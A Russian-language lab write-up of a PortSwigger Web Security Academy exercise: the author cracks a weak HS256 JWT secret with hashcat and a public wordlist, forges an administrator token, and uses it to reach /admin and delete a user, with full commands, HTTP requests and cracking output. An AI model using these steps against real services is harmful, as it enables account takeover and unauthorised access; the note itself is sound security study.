https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#how_do_i_install_hashcat         hashcat 🐈   "декодер"-переборщик - может если повезет и слабый ключ - подобрать его (главное не спалить GPU)  :)
`hashcat -a 0 -m 16500 <jwt> <wordlist>`

то есть - если подпись слабая - отправляем ее в hashcat и он бутфорсит ее до потери пульса! 
и если найдет то выдаст `<jwt>:<identified-secret>`

-------

лаба 
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key
#### слабый ключ подписи

можно использовать список известных ключей
`https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list`

задание:
взломать ключ
попасть в админку по /admin и удалить карлоса

-----

 
залогинался в wiener

вот запрос к своей стр
```http
GET /my-account?id=wiener HTTP/2
Host: 0a4c00bf03bdeaf081ea083c00b70079.web-security-academy.net
Cookie: session=eyJraWQiOiI5NjlmZjM3NS1kMWJiLTQzNTktOTJkNC1kZjViNzE5YmMzODUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUyODk3Nywic3ViIjoid2llbmVyIn0.EI8paWyfow9QpcPlVkJFC0a7CgGjy0FSE-qg6AC5opc
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0a4c00bf03bdeaf081ea083c00b70079.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

```

eyJraWQiOiI5NjlmZjM3NS1kMWJiLTQzNTktOTJkNC1kZjViNzE5YmMzODUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUyODk3Nywic3ViIjoid2llbmVyIn0.EI8paWyfow9QpcPlVkJFC0a7CgGjy0FSE-qg6AC5opc
```

видно что это jwt и он короткий

eyJraWQiOiI5NjlmZjM3NS1kMWJiLTQzNTktOTJkNC1kZjViNzE5YmMzODUiLCJhbGciOiJIUzI1NiJ9
хедер
```json

{"kid":"969ff375-d1bb-4359-92d4-df5b719bc385","alg":"HS256"}
```

HS256 - симметричный ключ

пейлоад
```json
eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUyODk3Nywic3ViIjoid2llbmVyIn0

{"iss":"portswigger","exp":1772528977,"sub":"wiener"}
```



eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUyODk3Nywic3ViIjoid2llbmVyIn0.EI8paWyfow9QpcPlVkJFC0a7CgGjy0FSE-qg6AC5opc

это уже бинарник

-----


будет его бутфорсить!
```

eyJraWQiOiI5NjlmZjM3NS1kMWJiLTQzNTktOTJkNC1kZjViNzE5YmMzODUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUyODk3Nywic3ViIjoid2llbmVyIn0.EI8paWyfow9QpcPlVkJFC0a7CgGjy0FSE-qg6AC5opc
```


----





1) скачал словарик с известными ключами там 10к их
	  словарь с возможными секретами (таких на гите много)
https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list  список известных секретов jwt

вот сам словарик с пейлоадами в ../../assets/
![[jwt.secrets.list]] 


2) установил  hashcat
https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#how_do_i_install_hashcat         hashcat 🐈   "декодер"-переборщик - может если повезет и слабый ключ - подобрать его (главное не спалить GPU)  :)
`hashcat -a 0 -m 16500 <jwt> </путь_/к_/wordlist>`

---


jwt.secrets.list


после установки хешкат
`hashcat -a 0 -m 16500 <jwt> </путь_/к_/wordlist>`

сохранил в файл  весь jwt 
```bash
echo "eyJraWQiOiI5NjlmZjM3NS1kMWJiLTQzNTktOTJkNC1kZjViNzE5YmMzODUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUyODk3Nywic3ViIjoid2llbmVyIn0.EI8paWyfow9QpcPlVkJFC0a7CgGjy0FSE-qg6AC5opc" > jwt.txt
```
и сохранил сам слвоарик в файл
/Desktop/jwt.secrets.list

запускаю и гоним вперед
```bash
hashcat -a 0 -m 16500 jwt.txt /Users/evgeniy/Desktop/jwt.secrets.list
```


---
и вуаля - не прошло и минуты

ответ = secret1

<img src="../../assets/hashcat012026-03-0313.22.28.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



secret1

```bash
METAL API (Metal 368.12)
========================
* Device #01: Apple M1 Pro, skipped

OpenCL API (OpenCL 1.2 (Apr 18 2025 21:46:03)) - Platform #1 [Apple]
====================================================================
* Device #02: Apple M1 Pro, GPU, 5461/10922 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 100c

Host memory allocated for this attack: 788 MB (2379 MB free)

Dictionary cache built:
* Filename..: /Users/evgeniy/Desktop/jwt.secrets.list
* Passwords.: 103979
* Bytes.....: 1231757
* Keyspace..: 103965
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Hashcat is expecting at least 1032192 base words but only got 10.1% of that.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.

eyJraWQiOiI5NjlmZjM3NS1kMWJiLTQzNTktOTJkNC1kZjViNzE5YmMzODUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUyODk3Nywic3ViIjoid2llbmVyIn0.EI8paWyfow9QpcPlVkJFC0a7CgGjy0FSE-qg6AC5opc:secret1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJraWQiOiI5NjlmZjM3NS1kMWJiLTQzNTktOTJkNC1kZjViNzE...AC5opc
Time.Started.....: Tue Mar  3 13:20:43 2026 (0 secs)
Time.Estimated...: Tue Mar  3 13:20:43 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/Users/evgeniy/Desktop/jwt.secrets.list)
Guess.Queue......: 1/1 (100.00%)
Speed.#02........: 21966.0 kH/s (0.05ms) @ Accel:1008 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 103965/103965 (100.00%)
Rejected.........: 0/103965 (0.00%)
Restore.Point....: 0/103965 (0.00%)
Restore.Sub.#02..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#02...:  -> 3beeee45bc938475ecba45075c53aae0f94299a83f824b25bbaf7965b4b0c60ff2b0c66c9047a026578deb5ecadabaa602891be2be66ed123a7b26876d4daddf
Hardware.Mon.SMC.: Fan0: 0%, Fan1: 0%
Hardware.Mon.#02.: Util: 37% Pwr:33mW

Started: Tue Mar  3 13:20:33 2026
Stopped: Tue Mar  3 13:20:44 2026
```






--------

теперь нужно изменить пейлоад
пейлоад
```json
eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUyODk3Nywic3ViIjoid2llbmVyIn0

{"iss":"portswigger","exp":1772528977,"sub":"wiener"}
```

на 

```json
{"iss":"portswigger","exp":1772528977,"sub":"administrator"}
```

и заново переподписать ключом который я добыл хешкотом

-----

едем на сайт
https://jwt.io/        дебагер JWT (кодирует/декодирует) все по полочкам разложит

он мне сможет переподписать даныне


поставил там   "sub": "administrator"

<img src="../../assets/hachcat010203332026-03-0313.29.21.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



кодировщик ругается матом на меня - говорит - что этот ключ очень слабый
```js
A key of 256 bits or larger MUST be used with HS256 as specified on [RFC 7518](https://datatracker.ietf.org/doc/html/rfc7518#section-3.2).
```

и я получаю новый jwt с параметром админа и переподписанный - ключом который забутфорсил

```json
eyJraWQiOiI5NjlmZjM3NS1kMWJiLTQzNTktOTJkNC1kZjViNzE5YmMzODUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUyODk3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.VXKkUIkCFqwhyGj2OFv-1sp4QSU3R7qRATr4N88onyA
```

-----



беру запрос к своей стр что выше показывал GET /my-account?id=wiener
меняю на 
подставляю новый jwt

```http
GET /admin HTTP/2
Host: 0a4c00bf03bdeaf081ea083c00b70079.web-security-academy.net
Cookie: session=eyJraWQiOiI5NjlmZjM3NS1kMWJiLTQzNTktOTJkNC1kZjViNzE5YmMzODUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUyODk3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.VXKkUIkCFqwhyGj2OFv-1sp4QSU3R7qRATr4N88onyA
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0a4c00bf03bdeaf081ea083c00b70079.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

ну и получаю доступ к админке

<img src="../../assets/jhgfd456782026-03-013.33.48.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



вижу путь к делиту карлос

```html
                       <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
```

удаляю карлос - лаба - решена!
GET /admin/delete?username=carlos HTTP/2

-----

### вывод

ключ должен быть сложны, большим, не менее 256 бит
согласно [RFC 7518](https://datatracker.ietf.org/doc/html/rfc7518#section-3.2)

небольшой ключ - можно подобрать, в инете есть десятки тысяч таких ключей

-------



